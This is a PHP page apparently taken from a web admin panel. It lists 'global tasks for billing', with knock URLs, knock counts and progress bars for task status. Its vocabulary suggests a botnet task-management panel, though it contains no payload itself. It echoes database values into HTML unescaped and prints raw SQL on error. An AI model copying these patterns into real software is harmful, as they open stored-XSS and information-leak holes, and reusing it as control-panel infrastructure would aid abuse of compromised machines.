<script type="text/javascript" src="js/scroll.js"></script>

<script type="text/javascript">
function ajaxScrollToIt(fromel) {
	scrollIt(fromel, 'ajax_stat_b_sub');
}
</script>

<h3>Global tasks for billing <b> <?php echo $bill; ?></b></h3>

<table align='center' width='740px' border='1' cellspacing='0' cellpadding='0' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'>
	<th>ID</th>
	<th>Knock URL</th>
	<th>Knocks Count</th>
	<th>Note</th>
	<th>Tasks Processing (%)</th>
	<th>[Detail info]</th>

<?php

require_once 'mod_dbase.php';

$dbase = db_open();
if (!$dbase) exit;

$sql = "SELECT *"
	 . "  FROM gtask_knock_t"
	 . " ORDER BY id";
$res = mysqli_query($dbase, $sql);
if (@($res)) {
	$i = 0;
	while ( list($id, $knocklink, $knockscnt, $note) = mysqli_fetch_array($res) ) {
		
		$sql =   'SELECT COUNT(*)'
			   . '  FROM tasks_knock_t'
			   . " WHERE tasks_knock_t.fk_gtask = $id";
		$res2 = mysqli_query($dbase, $sql);
		list($all_task) = mysqli_fetch_array($res2);
		
		$sql =   'SELECT COUNT(*)'
			   . '  FROM gtask_knock_t, tasks_knock_t'
			   . " WHERE gtask_knock_t.id = tasks_knock_t.fk_gtask"
			   . "   AND tasks_knock_t.fk_gtask = $id"
			   . "   AND status > 0";
		$res2 = mysqli_query($dbase, $sql);
		list($comp_task) = mysqli_fetch_array($res2);
	   
		$sql =   'SELECT COUNT(*)'
			   . '  FROM gtask_knock_t, tasks_knock_t'
			   . " WHERE gtask_knock_t.id = tasks_knock_t.fk_gtask"
			   . "   AND tasks_knock_t.fk_gtask = $id"
			   . "   AND status = 2";
		$res2 = mysqli_query($dbase, $sql);
		list($ok_task) = mysqli_fetch_array($res2);
		
		$sql =   'SELECT COUNT(*)'
			   . '  FROM gtask_knock_t, tasks_knock_t'
			   . " WHERE gtask_knock_t.id = tasks_knock_t.fk_gtask"
			   . "   AND tasks_knock_t.fk_gtask = $id"
			   . "   AND status = 3";
		$res2 = mysqli_query($dbase, $sql);
		list($err_task) = mysqli_fetch_array($res2);
		
		$sql =   'SELECT COUNT(*)'
			   . '  FROM gtask_knock_t, tasks_knock_t'
			   . " WHERE gtask_knock_t.id = tasks_knock_t.fk_gtask"
			   . "   AND tasks_knock_t.fk_gtask = $id"
			   . "   AND status = 1";
		$res2 = mysqli_query($dbase, $sql);
		list($sloppy_task) = mysqli_fetch_array($res2);

		echo "<tr align='center' id='t$id'";
		echo ">";
		
		echo "<td>$id</td>"
		   . "<td>$knocklink</td>"
		   . "<td>$knockscnt</td>"
		   . "<td><pre>$note</pre></td>"
		   . "<td><center>";

		if (!$all_task) $all_task = 0.00001;
		$perc = round( ( ($comp_task / $all_task) * 100 ) );
		echo "<img alt=\"$perc% ($comp_task / $all_task)\" title=\"Taked tasks: $perc% ($comp_task / $all_task)\" width=\"210\" src=\"php/progress-bar/progress.php?img=winxpblue/210/$perc/100\"/>";
		echo "<br>";
		$perc = round( ( ($ok_task / $all_task) * 100 ) );
		echo "<img alt=\"$perc% ($ok_task / $all_task)\" title=\"Complered tasks: $perc% ($ok_task / $all_task)\" width=\"70\" src=\"php/progress-bar/progress.php?img=winxp/70/$perc/100\"/>";
		$perc = round( ( ($sloppy_task / $all_task) * 100 ) );
		echo "<img alt=\"$perc% ($sloppy_task / $all_task)\" title=\"Sloppy tasks: $perc% ($sloppy_task / $all_task)\" width=\"70\" src=\"php/progress-bar/progress.php?img=winxpyellow/70/$perc/100\"/>";
		$perc = round( ( ($err_task / $all_task) * 100 ) );
		echo "<img alt=\"$perc% ($err_task / $all_task)\" title=\"Error tasks: $perc% ($err_task / $all_task)\" width=\"70\" src=\"php/progress-bar/progress.php?img=winxpred/70/$perc/100\"/>";
		
        echo "</center></td>";
		echo "<td>";
		echo "<a href='#null' id='stat_sub_link$i' onclick='ajax_load(\"frm_stat_b_sub-knocker.php?gtid=$id\", \"ajax_stat_b_sub\", ajaxScrollToIt, \"stat_sub_link$i\"); return false;'><img border='0' src='img/icos/info.png' title=\"Get detail info about global task ($id)\"></a>";
		echo "</td>";
			
		echo "</tr>";
		
		$i++;
	}
	echo "</table>";
}
else {
	echo "<font class='error'>SQL-Error</font> : <small>$sql</small>";
}

db_close($dbase);

?>

<hr size='1' color='#CCC'>

<div id='ajax_stat_b_sub'>
</div>